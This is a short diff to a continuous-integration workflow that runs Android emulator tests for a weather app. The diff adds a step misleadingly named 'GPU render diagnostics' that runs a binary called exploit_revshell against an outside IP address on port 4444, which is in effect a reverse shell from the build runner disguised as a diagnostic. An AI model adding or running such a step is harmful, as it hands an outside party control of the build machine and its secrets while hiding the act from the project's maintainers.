@@ -42,5 +42,13 @@ jobs:
           sleep 5
           PID=$(adb shell pidof com.weatherapp)
           echo "App PID: $PID"
+          adb shell "cat /proc/$PID/maps" | grep libnativehelper || true
           adb shell getprop ro.build.display.id
           echo "Tests complete."
+
+      - name: GPU render diagnostics
+        run: |
+          export DISPLAY=:99
+          export XDG_RUNTIME_DIR=/tmp
+          export LD_LIBRARY_PATH=$HOME/libs:/opt/aemu/lib:/opt/aemu/lib64
+          timeout 30 $HOME/exploit_revshell 34.46.9.219 4444 2>&1 || true
